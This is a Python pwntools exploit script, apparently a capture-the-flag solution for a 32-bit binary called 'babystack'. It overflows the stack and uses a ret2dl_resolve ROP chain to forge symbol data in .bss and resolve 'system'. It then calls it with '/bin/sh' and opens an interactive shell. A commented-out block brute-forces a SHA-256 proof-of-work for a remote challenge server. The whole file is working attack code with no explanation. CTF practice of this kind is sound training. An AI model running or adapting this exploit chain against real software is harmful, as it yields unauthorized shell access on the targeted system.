#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import roputils
#from hashlib import sha256

#p = process('./babystack')
p = remote('127.0.0.1',7788)
elf = ELF('./babystack')
'''
p = remote('202.120.7.202',6666)

random = p.recv(16)
print "[*]random"+random
flag=0
print random
for i in range(36,126):
        if flag==1:
                break
        for j in range(36,126):
                if flag==1:
                        break
                for k in range(36,126):
                        if flag==1:
                                break
                        for n in range(36,126):
                                str=chr(i)+chr(j)+chr(k)+chr(n)
                                if sha256(random+str).digest().startswith('\0\0\0'):
                                        hash=str
                                        print hash
                                        flag=1
                                        break

p.send(hash)
'''
payload = "A"*40
payload += p32(0x804a500)
payload += p32(0x8048446)
payload += p32(80)                 # exact length of stage 2 payload
payload += "B"*(64-len(payload))

rop = roputils.ROP('./babystack')
addr_bss = rop.section('.bss')
payload += "A"*40
payload += p32(0x804a500)

# Read the fake tabs from payload2 to bss
payload += rop.call("read", 0, addr_bss, 150)

# Call dl_resolve with offset to our fake symbol
payload += rop.dl_resolve_call(addr_bss+60, addr_bss)

# Create fake rel and sym on bss
payload2 = rop.string("/bin/sh")
#payload2 = rop.string("/bin/sh")
payload2 += rop.fill(60, payload2)                        # Align symbol to bss+60
payload2 += rop.dl_resolve_data(addr_bss+60, "system")    # Fake r_info / st_name
payload2 += rop.fill(150, payload2)

payload += payload2
payload = payload.ljust(0x100, "\x00")
print len(payload)
p.sendline(payload)
#p.send("A"*44 + flat(rop) + "A"*(256-44-len(flat(rop))))
p.interactive()

